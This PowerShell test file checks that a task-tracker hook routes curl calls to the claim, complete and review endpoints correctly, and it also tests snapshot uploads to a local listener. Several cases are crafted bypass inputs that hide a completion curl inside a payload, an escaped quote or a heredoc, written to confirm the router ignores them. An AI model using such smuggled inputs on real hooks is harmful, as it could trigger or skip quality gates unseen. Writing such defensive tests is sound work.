# 5m: a grep whose PATTERN names a completion route does not route
Assert-NoRoute "5m: grep for a completion route" `
    '{"tool_input":{"command":"grep -rn PATCH.*api/tasks/:id/complete test/kanban_web/"}}'

# 5n: the observed misfire — an echo of a completion URL with a fake id, which
# previously ran after_doing AND issued a live changed_files PUT to task 999999999
Assert-NoRoute "5n: echo of a completion URL with a fake id" `
    '{"tool_input":{"command":"echo curl -X PATCH https://stridelikeaboss.com/api/tasks/999999999/complete"}}'

# 5o/5p: an exploratory GET probe issues a request, but not THAT request
Assert-NoRoute "5o: GET probe of a completion URL" `
    '{"tool_input":{"command":"curl -s https://stridelikeaboss.com/api/tasks/12345/complete"}}'
Assert-NoRoute "5p: GET probe of the claim URL" `
    '{"tool_input":{"command":"curl -s https://stridelikeaboss.com/api/tasks/claim"}}'

# 5q/5r: mention-only negatives for the remaining two routed URLs
Assert-NoRoute "5q: grep for a mark_reviewed route" `
    '{"tool_input":{"command":"rg -n api/tasks/[0-9]+/mark_reviewed hooks/"}}'
Assert-NoRoute "5r: grep for the claim URL" `
    '{"tool_input":{"command":"grep -c api/tasks/claim hooks/stride-hook.sh"}}'

# 5s: the heredoc reproduction — documentation ABOUT the completion curl sits at
# column 0 with clean quote state, so only body-stripping stops it
Assert-NoRoute "5s: heredoc writing docs about the completion curl" `
    '{"tool_input":{"command":"cat > docs/d220.md <<EOF\nThe completion call looks like:\n\ncurl -X PATCH \"$STRIDE_API_URL/api/tasks/$TASK_ID/complete\" \\\n  -H \"Authorization: Bearer $STRIDE_API_TOKEN\" -d @payload.json\nEOF"}}'

# 5t: AC 3 — a changed_files PUT whose payload TEXT contains a completion URL.
# The trigger is content-controlled (a raw code diff), so this is the
# security-relevant case.
Assert-NoRoute "5t: changed_files PUT with a completion URL in its payload" `
    '{"tool_input":{"command":"curl -X PUT \"$STRIDE_API_URL/api/tasks/42/changed_files\" -H \"Authorization: Bearer $STRIDE_API_TOKEN\" -d ''{\"changed_files\":[{\"path\":\"SKILL.md\",\"diff\":\"+curl -X PATCH https://h/api/tasks/9/complete\"}]}''"}}'

# 5u: the same, but the diff spans lines and one BEGINS with the completion curl
Assert-NoRoute "5u: changed_files PUT whose diff line starts with the completion curl" `
    '{"tool_input":{"command":"curl -X PUT \"$STRIDE_API_URL/api/tasks/42/changed_files\" -d ''{\"diff\":\"--- a/SKILL.md\n+++ b/SKILL.md\ncurl -X PATCH \\\"$STRIDE_API_URL/api/tasks/7/complete\\\" \\\n  -H \\\"Authorization: Bearer tok\\\"\n\"}''"}}'

# 5v: interpolated claim URL still routes (agents rarely write literals)
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -sS -X POST $STRIDE_API_URL/api/tasks/claim -d @payload.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Exit "5v: interpolated claim exits 0" 0 $r.ExitCode
Assert-Contains "5v: interpolated claim still runs before_doing" "before_doing_executed" $r.Stdout

# 5w: the DOCUMENTED completion curl — interpolated, backslash-continued over
# five physical lines, piped into tee. A silent miss here would remove the
# after_doing quality gate entirely, so both phases are asserted.
$MlComplete = '{"tool_input":{"command":"curl -sS -X PATCH \"$STRIDE_API_URL/api/tasks/$TASK_ID/complete\" \\\n  -H \"Authorization: Bearer $STRIDE_API_TOKEN\" \\\n  -H ''Content-Type: application/json'' \\\n  -d @payload.json \\\n  | tee \"$CLAUDE_PROJECT_DIR/.stride/.last-api-response.json\""}}'
$r = Invoke-HookScript -InputJson $MlComplete -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5w: documented multi-line completion still runs after_doing" "after_doing_executed" $r.Stdout
$r = Invoke-HookScript -InputJson $MlComplete -Phase 'post' -ProjectDir $proj5
Assert-Contains "5w: documented multi-line completion still runs before_review" "before_review_executed" $r.Stdout

# 5x: the URL on its own continuation line, not the curl line
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -sS -X PATCH \\\n  \"$STRIDE_API_URL/api/tasks/1234/complete\" \\\n  -H \"Authorization: Bearer $STRIDE_API_TOKEN\" \\\n  -d @payload.json"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5x: URL on its own continuation line still runs after_doing" "after_doing_executed" $r.Stdout

# 5y: brace-form interpolation, multi-line mark_reviewed
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -sS -X PATCH \"${STRIDE_API_URL}/api/tasks/77/mark_reviewed\" \\\n  -H \"Authorization: Bearer $STRIDE_API_TOKEN\" \\\n  -d @review.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5y: interpolated mark_reviewed still runs after_review" "after_review_executed" $r.Stdout

# 5z: the URL AFTER the flags still routes
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -sS -X PATCH -d @payload.json $STRIDE_API_URL/api/tasks/77/complete"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5z: URL after the flags still runs before_review" "before_review_executed" $r.Stdout

# 5aa: a compound command whose curl is not the first token
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"mkdir -p .stride && curl -X POST $STRIDE_API_URL/api/tasks/claim -d @p.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5aa: && before the claim curl still runs before_doing" "before_doing_executed" $r.Stdout

# 5ab: timeout/env/absolute-path wrappers still reach the client
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"timeout 60 env FOO=1 /usr/bin/curl -X PATCH https://h/api/tasks/9/complete -d @p.json"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5ab: timeout/env/abs-path wrappers still run after_doing" "after_doing_executed" $r.Stdout

# 5ac: implied POST (curl defaults to POST when -d is present, no -X)
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -d @payload.json $STRIDE_API_URL/api/tasks/claim"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5ac: implied-POST claim still runs before_doing" "before_doing_executed" $r.Stdout

# 5ad: a REAL completion whose payload text names a mark_reviewed URL routes to
# before_review, never after_review — payload text must not steer the section
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH \"$STRIDE_API_URL/api/tasks/5/complete\" -H \"Authorization: Bearer $T\" -d ''{\"completion_notes\":\"then I hit /api/tasks/6/mark_reviewed by hand\"}''"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5ad: completion with a mark_reviewed mention runs before_review" "before_review_executed" $r.Stdout
Assert-NotContains "5ad: and does NOT run after_review" "after_review_executed" $r.Stdout

# 5ae: the escaped-quote bypass — a -d payload placed BEFORE the URL, whose
# embedded \" would flip a parity-only quote tracker back OUT of quoting, must
# not let payload text supply the request URL and method.
Assert-NoRoute "5ae: escaped-quote payload before the URL" `
    '{"tool_input":{"command":"curl -X PUT -d \"{\\\"diff\\\":\\\"x curl -X PATCH https://h/api/tasks/9/complete y\\\"}\" \"$U/api/tasks/42/changed_files\""}}'

# 5af: pitfall 2 — the whole URL hoisted into a shell variable still routes
$Hoisted = '{"tool_input":{"command":"URL=\"$STRIDE_API_URL/api/tasks/$TASK_ID/complete\"; curl -X PATCH \"$URL\" -d @payload.json"}}'
$r = Invoke-HookScript -InputJson $Hoisted -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5af: hoisted-URL completion still runs after_doing" "after_doing_executed" $r.Stdout
$r = Invoke-HookScript -InputJson $Hoisted -Phase 'post' -ProjectDir $proj5
Assert-Contains "5af: hoisted-URL completion still runs before_review" "before_review_executed" $r.Stdout

# 5ag: a hoisted variable that does NOT name the API is not resolved into one
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"URL=\"https://example.com/health\"; curl -X PATCH \"$URL\" -d @payload.json"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Eq "5ag: unrelated hoisted URL runs no section" "" $r.Stdout.Trim()

# 5at-5aw: the sh/ps1 divergences acceptance criterion 4 requires closing.
# -x is a proxy, not -X; CURL is not curl; a trailing slash is stripped once.
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -x http://proxy:8080 \"$STRIDE_API_URL/api/tasks/5/complete\" -d @p.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5at: -x is a proxy option, not -X" "before_review_executed" $r.Stdout
Assert-NoRoute "5au: CURL in caps is not the curl client" `
    '{"tool_input":{"command":"CURL -X PATCH https://h/api/tasks/5/complete -d @p.json"}}'
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://h/api/tasks/5/complete/ -d @p.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5av: one trailing slash is stripped" "before_review_executed" $r.Stdout
Assert-NoRoute "5aw: --data-ascii= alone does not make a GET probe route" `
    '{"tool_input":{"command":"curl -G --data-ascii=x https://h/api/tasks/5/complete"}}'

# 5ah: a CRLF command line still routes. The CR sits on the URL token, so this
# actually exercises the trim rather than passing either way.
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH -d @p.json https://h/api/tasks/55/complete\r"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5ah: CRLF command still runs after_doing" "after_doing_executed" $r.Stdout

# 5ai-5ak: the heredoc stripper is the only control that stops a command WRITING
# documentation about the completion curl from being routed as one.
Assert-NoRoute "5ai: here-string on the opener line" `
    '{"tool_input":{"command":"grep -q x <<< \"$s\" && cat > d.md <<EOF\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nEOF"}}'
Assert-NoRoute "5aj: two heredocs on one line" `
    '{"tool_input":{"command":"cat <<DOC > d.md; cat <<JSONP > p.json\ndocs\nDOC\ncurl -X PATCH https://h/api/tasks/9/complete\nJSONP"}}'
Assert-NoRoute "5ak: <<- with a space-indented delimiter lookalike" `
    '{"tool_input":{"command":"cat <<-EOF > d.md\ndocs\n  EOF\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nEOF"}}'

# 5al: $'...' is ANSI-C quoting — \' does NOT close it
Assert-NoRoute "5al: ANSI-C quoted payload with an escaped apostrophe" `
    '{"tool_input":{"command":"curl -X PUT -d $''a\\''b curl -X PATCH /api/tasks/9/complete x'' \"$U/api/tasks/42/changed_files\""}}'

# 5am-5ao: a request that does not COMPLETE the task must not run the section
Assert-NoRoute "5am: methodless probe with an unresolvable -X" `
    '{"tool_input":{"command":"curl -X \"$METHOD\" https://h/api/tasks/9/complete"}}'
Assert-NoRoute "5an: redirect target that looks like a completion URL" `
    '{"tool_input":{"command":"curl -X POST https://example.com/x -d @p.json > /tmp/api/tasks/9/complete"}}'
Assert-NoRoute "5ao: --dump-header value that looks like a completion URL" `
    '{"tool_input":{"command":"curl --dump-header /api/tasks/9/complete -X POST https://example.com/x -d @p.json"}}'

# 5ax: a redirect on a HIGH file descriptor must consume its target too — an
# operator table covering only fds 0-2 left the target to be read as the request
# URL, which both picked the section and supplied the task id.
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH -d @p.json 3> /tmp/api/tasks/9/complete \"$STRIDE_API_URL/api/tasks/5/complete\""}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5ax: high-fd redirect does not displace the real URL" "before_review_executed" $r.Stdout

# 5ap/5aq: forms close to the documented one must not fail closed
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"(curl -X PATCH \"$STRIDE_API_URL/api/tasks/321/complete\" -d @payload.json)"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5ap: subshell-wrapped completion still runs after_doing" "after_doing_executed" $r.Stdout
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"URL=\"$STRIDE_API_URL/api/tasks/1234/complete\"\ncurl -X PATCH \"$URL\" -d @payload.json"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5aq: two-line hoisted URL still runs after_doing" "after_doing_executed" $r.Stdout

# 5ar/5as: variable resolution is conservative — two assignments to one name
# means the value depends on control flow we do not evaluate, so decline rather
# than guess a task id; and names are case-sensitive (a bare PowerShell
# hashtable would resolve $url against URL=, which bash never would)
Assert-NoRoute "5ar: two assignments to one name decline to resolve" `
    '{"tool_input":{"command":"URL=https://h/api/tasks/claim; URL=https://h/api/tasks/9/complete; curl -X POST \"$URL\" -d @p.json"}}'
Assert-NoRoute "5as: variable names are case-sensitive" `
    '{"tool_input":{"command":"URL=https://h/api/tasks/9/complete; curl -X PATCH \"$url\" -d @p.json"}}'

# 5bb: the sentinel is order-INDEPENDENT — a non-API value assigned FIRST must
# still block, or the common `if $DRY; then URL=noop; else URL=...; fi` shape
# resolves a branch bash may never have taken
Assert-NoRoute "5bb: non-API value assigned first still blocks" `
    '{"tool_input":{"command":"URL=https://example.com/noop; URL=https://h/api/tasks/9/complete; curl -X PATCH \"$URL\" -d @p.json"}}'

# 5bc: a literal URL is unaffected by sentinel-ed assignments elsewhere
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"URL=https://example.com/a; URL=https://example.com/b; curl -X PATCH https://h/api/tasks/333/complete -d @p.json"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "5bc: a literal URL still routes alongside a sentinel" "before_review_executed" $r.Stdout

# 5bd: bash KEEPS what a backslash escapes, so the delimiter is E'F, not EF —
# a delete-all-quotes reduction dequeues at the EF line and scans the body
Assert-NoRoute "5bd: heredoc delimiter with an escaped quote" `
    '{"tool_input":{"command":"cat <<E\\''F > d.md\nEF\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nE''F"}}'

# 5be/5bf: the MULTI-LINE assignment layouts. 5bb cannot fail on its own — its
# second assignment puts /api/tasks/ on the same line, so the fast path
# tokenises it anyway. Here the first assignment's line names no API path.
Assert-NoRoute "5be: two-line branch-dependent URL declines to resolve" `
    '{"tool_input":{"command":"URL=\"https://e.com/noop\"\nURL=\"$U/api/tasks/9/complete\"\ncurl -X PATCH \"$URL\" -d @p.json"}}'
Assert-NoRoute "5bf: if/else branch-dependent URL declines to resolve" `
    '{"tool_input":{"command":"if $DRY; then\n  URL=\"https://e.com/noop\"\nelse\n  URL=\"$U/api/tasks/9/complete\"\nfi\ncurl -X PATCH \"$URL\" -d @p.json"}}'

# 5bg-5bi: delimiters bash derives differently from a split-then-unquote pass.
# Each expected terminator was verified against bash itself.
Assert-NoRoute "5bg: delimiter containing a quoted space" `
    '{"tool_input":{"command":"cat <<''A B'' > d.md\nA\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nA B"}}'
Assert-NoRoute "5bh: delimiter with a backslash inside double quotes" `
    '{"tool_input":{"command":"cat <<\"a\\bc\" > d.md\nabc\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\na\\bc"}}'
Assert-NoRoute "5bi: ANSI-C quoted delimiter" `
    '{"tool_input":{"command":"cat <<$''xy'' > d.md\n$xy\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nxy"}}'

# 5bj: an ANSI-C delimiter carrying an escape we do not interpret is marked
# UNSAFE, so its body is swallowed to EOF rather than dequeuing on a rendering
# that is not bash's — fail-closed instead of exposing the body to the scanner.
Assert-NoRoute "5bj: uninterpretable ANSI-C escape swallows the body" `
    '{"tool_input":{"command":"cat <<$''a\\nb'' > d.md\nanb\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\nanb"}}'

# 5ay-5ba: the quote-aware heredoc scanner and the empty-delimiter heredoc
Assert-NoRoute "5ay: heredoc with an empty delimiter" `
    '{"tool_input":{"command":"cat <<'''' > d.md\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\n\nx"}}'
Assert-NoRoute "5az: << inside a quoted string is not a heredoc opener" `
    '{"tool_input":{"command":"echo \"shift << END\"\ncurl -X PUT \"$U/api/tasks/42/changed_files\" -d ''{\"diff\":\"\nEND\ncurl -X PATCH https://h/api/tasks/9/complete -d @p.json\n\"}''"}}'
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"echo \"a << b\"\ncurl -X PATCH https://h/api/tasks/77/complete -d @p.json"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Contains "5ba: a quoted << does not swallow a real completion" "after_doing_executed" $r.Stdout

# ============================================================
# Test Group 6: Edge cases
# ============================================================
Write-Host ""
Write-Host "=== Test Group 6: Edge cases ==="

# 6a: .stride.md with no trailing newline
$noNewlineProj = Join-Path $TmpDir 'no-newline-project'
New-Item -ItemType Directory -Path $noNewlineProj -Force | Out-Null
[System.IO.File]::WriteAllText(
    (Join-Path $noNewlineProj '.stride.md'),
    "## before_doing`n``````bash`necho `"no trailing newline`"`n``````",
    [System.Text.Encoding]::UTF8
)

$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $noNewlineProj
Assert-Exit "no trailing newline exits 0" 0 $r.ExitCode
Assert-Contains "no trailing newline runs command" "no trailing newline" $r.Stdout

# 6b: Command with environment variable references
$envProj = Join-Path $TmpDir 'env-project'
New-Item -ItemType Directory -Path $envProj -Force | Out-Null
Set-Content -Path (Join-Path $envProj '.stride.md') -Value @'
## before_doing
```bash
echo "home=$HOME"
```
'@ -Encoding UTF8

$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $envProj
Assert-Exit "env var expansion exits 0" 0 $r.ExitCode
Assert-Contains "env var expanded" "home=" $r.Stdout

# 6c: .stride.md with CRLF line endings
$crlfProj = Join-Path $TmpDir 'crlf-project'
New-Item -ItemType Directory -Path $crlfProj -Force | Out-Null
[System.IO.File]::WriteAllText(
    (Join-Path $crlfProj '.stride.md'),
    "## before_doing`r`n``````bash`r`necho `"crlf test`"`r`n```````r`n",
    [System.Text.Encoding]::UTF8
)

$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $crlfProj
Assert-Exit "CRLF line endings exits 0" 0 $r.ExitCode
Assert-Contains "CRLF runs command" "crlf test" $r.Stdout

# 6d: JSON with tool_response (env caching path)
$cacheProj = Join-Path $TmpDir 'cache-project'
New-Item -ItemType Directory -Path $cacheProj -Force | Out-Null
Set-Content -Path (Join-Path $cacheProj '.stride.md') -Value @'
## before_doing
```bash
echo "id=$TASK_IDENTIFIER title=$TASK_TITLE"
```
'@ -Encoding UTF8

$claimWithResponse = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"},"tool_response":"{\"data\":{\"id\":42,\"identifier\":\"W99\",\"title\":\"Test Task\",\"status\":\"doing\",\"complexity\":\"small\",\"priority\":\"high\"}}"}'
$r = Invoke-HookScript -InputJson $claimWithResponse -Phase 'post' -ProjectDir $cacheProj
Assert-Exit "env caching exits 0" 0 $r.ExitCode
Assert-Contains "env cache: identifier" "id=W99" $r.Stdout
Assert-Contains "env cache: title" "title=Test Task" $r.Stdout
# Clean up cache
$cacheFile = Join-Path $cacheProj '.stride-env-cache'
if (Test-Path $cacheFile) { Remove-Item -Force $cacheFile }

# 6e: Structured JSON output on success
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $proj5
Assert-Contains "success JSON has hook field" '"hook"' $r.Stdout
Assert-Contains "success JSON has status" '"success"' $r.Stdout
# D65: success JSON carries the per-command output array and writes no stderr.
Assert-Contains "success JSON has commands_output field" '"commands_output"' $r.Stdout
Assert-Eq "success path writes nothing to stderr" "" $r.Stderr.Trim()
# stdout must be a single parseable JSON object with status success.
$successObj = $r.Stdout | ConvertFrom-Json
Assert-Eq "success stdout parses to status success" "success" $successObj.status

# 6e2: D65 — a PASSING command that writes to STDERR (exit 0) is the exact
# production trigger. Its stderr must NOT reach fd 2 (where Claude Code
# mislabels it); it must land in the success JSON's commands_output[].stderr.
$stderrOkProj = Join-Path $TmpDir 'stderr-ok-project'
New-Item -ItemType Directory -Path $stderrOkProj -Force | Out-Null
Set-Content -Path (Join-Path $stderrOkProj '.stride.md') -Value @'
## before_doing
```bash
echo "compiling to stderr" 1>&2
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $stderrOkProj
Assert-Exit "stderr-writing passing gate exits 0" 0 $r.ExitCode
Assert-Eq "stderr-writing passing gate writes nothing to fd 2" "" $r.Stderr.Trim()
$soObj = $r.Stdout | ConvertFrom-Json
Assert-Contains "passing command's stderr folded into commands_output" "compiling to stderr" $soObj.commands_output[0].stderr

# 6f: Structured JSON output on failure
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $failProj
Assert-Contains "failure JSON has hook field" '"hook"' $r.Stdout
Assert-Contains "failure JSON has failed status" '"failed"' $r.Stdout

# ============================================================
# Test Group 7: PUT snapshot upload (W780)
# ============================================================
# Mirror of test-stride-hook.sh Test Group 8. Invoke-FinalizeAfterDoing PUTs
# the on-disk snapshot to {URL}/api/tasks/{TASK_ID}/changed_files. Full URL/
# token extraction is covered by the bash test suite — these tests verify
# wrapper behavior (exit codes, fire-and-forget semantics, snapshot
# persistence) which is the ps1-specific contract.
Write-Host ""
Write-Host "=== Test Group 7: PUT snapshot upload (W780) ==="

# 7a: PUT-success — snapshot uploaded to a local HttpListener
$putSuccessProj = Join-Path $TmpDir 'put-success-project'
New-Item -ItemType Directory -Path $putSuccessProj -Force | Out-Null
Set-Content -Path (Join-Path $putSuccessProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $putSuccessProj '.stride-changed-files.json') `
    -Value '[{"path":"foo.txt","diff":"unified patch body"}]' -Encoding UTF8
Set-Content -Path (Join-Path $putSuccessProj '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=abc" -Encoding UTF8

# Bind a one-shot listener on an ephemeral port.
$putPort = 18877
$putFixture = Join-Path $TmpDir 'put-fixture.json'
if (Test-Path $putFixture) { Remove-Item -Force $putFixture }

$putListenerJob = Start-Job -ArgumentList $putPort, $putFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $req = $ctx.Request
        $reader = [System.IO.StreamReader]::new($req.InputStream)
        $body = $reader.ReadToEnd()
        @{
            Method = $req.HttpMethod
            Path   = $req.Url.AbsolutePath
            Auth   = $req.Headers['Authorization']
            Body   = $body
        } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $resp = $ctx.Response
        $resp.StatusCode = 200
        $resp.OutputStream.Close()
    } catch {
        # Listener tear-down errors are ignored.
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}

try {
    $null = Wait-ForListener -Port $putPort
    $putCompleteCmd = "curl -X PATCH http://localhost:$putPort/api/tasks/99/complete -H `"Authorization: Bearer test_token_xyz`""
    # ConvertTo-Json escapes the command's embedded quotes — hand-rolling the
    # JSON here produces an invalid document whose fallback-regex extraction
    # truncates the command at the first inner quote, dropping the token.
    $putJson = @{ tool_input = @{ command = $putCompleteCmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $putJson -Phase 'pre' -ProjectDir $putSuccessProj
    Assert-Exit "7a: hook exits 0 after PUT" 0 $r.ExitCode

    Wait-Job $putListenerJob -Timeout 8 | Out-Null
    Remove-Job $putListenerJob -Force -ErrorAction SilentlyContinue

    if (Test-Path $putFixture) {
        $record = Get-Content -Raw -Path $putFixture | ConvertFrom-Json
        Assert-Eq "7a: PUT method" "PUT" $record.Method
        Assert-Contains "7a: PUT path targets /changed_files" "/api/tasks/99/changed_files" $record.Path
        Assert-Eq "7a: Bearer token from `$Command" "Bearer test_token_xyz" $record.Auth
        # D61: the raw diff/path text MUST NOT appear in the wire body — it is
        # base64-encoded so an edge filter cannot misread it as an attack.
        Assert-NotContains "7a: raw diff text absent from the wire body (encoded)" "foo.txt" $record.Body

        # D61/D35: body must be a wrapped JSON object whose "changed_files"
        # value is the transport envelope {encoding:"base64", data:"<b64>"} —
        # NOT a bare array (which would persist as NULL server-side) and NOT
        # raw diff text. Mirrors test 8a in test-stride-hook.sh.
        try {
            $parsedBody = $record.Body | ConvertFrom-Json
            if ($parsedBody -is [pscustomobject] -and
                $parsedBody.PSObject.Properties.Name -contains 'changed_files' -and
                $parsedBody.changed_files.encoding -eq 'base64' -and
                $parsedBody.changed_files.data -is [string]) {
                Write-Host "  PASS: 7a: PUT body is the base64-encoded changed_files envelope" -ForegroundColor Green
                $script:PASS++
            } else {
                Write-Host "  FAIL: 7a: PUT body is not the encoded envelope: $($record.Body)" -ForegroundColor Red
                $script:FAIL++
            }

            # Round-trip: decoding the envelope's data reproduces the snapshot
            # file contents byte-for-byte.
            $snapshotRaw = [System.IO.File]::ReadAllBytes((Join-Path $putSuccessProj '.stride-changed-files.json'))
            $decoded = [System.Convert]::FromBase64String($parsedBody.changed_files.data)
            $snapshotText = [System.Text.Encoding]::UTF8.GetString($snapshotRaw)
            $decodedText = [System.Text.Encoding]::UTF8.GetString($decoded)
            if ($decodedText -eq $snapshotText) {
                Write-Host "  PASS: 7a: envelope data round-trips to the snapshot file content" -ForegroundColor Green
                $script:PASS++
            } else {
                Write-Host "  FAIL: 7a: round-trip mismatch — decoded: $decodedText vs snapshot: $snapshotText" -ForegroundColor Red
                $script:FAIL++
            }
        } catch {
            Write-Host "  FAIL: 7a: PUT body did not parse as JSON: $($_.Exception.Message)" -ForegroundColor Red
            $script:FAIL++
        }
    } else {
        Write-Host "  FAIL: 7a: PUT did not arrive at listener" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($putListenerJob -and $putListenerJob.State -eq 'Running') {
        Stop-Job $putListenerJob -ErrorAction SilentlyContinue
        Remove-Job $putListenerJob -Force -ErrorAction SilentlyContinue
    }
}

# 7e (D67): Invoke-ChangedFilesUpload strips the hook's own root artifacts from
# the snapshot before PUT.
# (W2105) This used to say "the ps1 has no capture step, so this upload-side
# filter is the equivalent enforcement point". W2100 built the capture step and
# Group 21 covers it, so there are now TWO enforcement points and this is the
# second, not a stand-in for a missing first. A same-named file in a
# subdirectory is kept; the legitimate change is kept.
# (W2100) This was a pre-seeded snapshot in a NON-git directory, which tested
# the upload-side filter because ps1 built no snapshot of its own. Now that it
# does, a pre-seeded file is simply overwritten, so the fixture is a real repo
# and the same expectation — exactly lib/foo.ex and sub/.stride-changed-files.json
# survive — is asserted against the CAPTURE-side exclusion, which is the
# stronger enforcement point. Upload-side filtering keeps its own coverage in
# 7e2 immediately below, via the self-heal path — the only remaining path that
# uploads a snapshot it did not build.
$exclProj = Join-Path $TmpDir 'put-exclude-project'
New-Item -ItemType Directory -Path $exclProj -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $exclProj 'lib') -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $exclProj 'sub') -Force | Out-Null
Set-Content -Path (Join-Path $exclProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $exclProj '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=abc" -Encoding UTF8
& git -C $exclProj init -q 2>$null | Out-Null
& git -C $exclProj config user.email 'test@example.com' 2>$null | Out-Null
& git -C $exclProj config user.name 'Test' 2>$null | Out-Null
& git -C $exclProj config commit.gpgsign false 2>$null | Out-Null
# .stride.md and .stride-env-cache are gitignored so they do not surface as
# untracked entries; the two ROOT artifacts deliberately are NOT ignored, so the
# capture's own exclusion is what has to remove them.
Set-Content -Path (Join-Path $exclProj '.gitignore') -Value ".stride.md`n.stride-env-cache`n" -Encoding UTF8
Set-Content -Path (Join-Path $exclProj 'base.txt') -Value 'base' -Encoding UTF8
& git -C $exclProj add .gitignore base.txt 2>$null | Out-Null
& git -C $exclProj commit -q -m 'c1' 2>$null | Out-Null
Set-Content -Path (Join-Path $exclProj 'lib/foo.ex') -Value 'defmodule Foo do' -Encoding UTF8
& git -C $exclProj add lib/foo.ex 2>$null | Out-Null
& git -C $exclProj commit -q -m 'c2' 2>$null | Out-Null
# Real working-tree change plus the same-named subdirectory file that must survive.
Set-Content -Path (Join-Path $exclProj 'lib/foo.ex') -Value "defmodule Foo do`n  def bar, do: :ok`nend" -Encoding UTF8
Set-Content -Path (Join-Path $exclProj 'sub/.stride-changed-files.json') -Value 'user file' -Encoding UTF8
# The root artifacts the capture must strip.
Set-Content -Path (Join-Path $exclProj '.stride-diff-upload-state') -Value 'state body' -Encoding UTF8
Set-Content -Path (Join-Path $exclProj '.stride-changed-files.json') `
    -Value '[{"path":".stride-diff-upload-state","diff":"state body"},{"path":"lib/foo.ex","diff":"real patch"},{"path":"sub/.stride-changed-files.json","diff":"user file"},{"path":".stride-changed-files.json","diff":"snapshot body"}]' -Encoding UTF8

$exclPort = 18879
$exclFixture = Join-Path $TmpDir 'put-exclude-fixture.json'
if (Test-Path $exclFixture) { Remove-Item -Force $exclFixture }

$exclListenerJob = Start-Job -ArgumentList $exclPort, $exclFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $req = $ctx.Request
        $reader = [System.IO.StreamReader]::new($req.InputStream)
        $body = $reader.ReadToEnd()
        @{ Body = $body } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $resp = $ctx.Response
        $resp.StatusCode = 200
        $resp.OutputStream.Close()
    } catch {
        # Listener tear-down errors are ignored.
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}

try {
    $null = Wait-ForListener -Port $exclPort
    $exclCmd = "curl -X PATCH http://localhost:$exclPort/api/tasks/99/complete -H `"Authorization: Bearer test_token_xyz`""
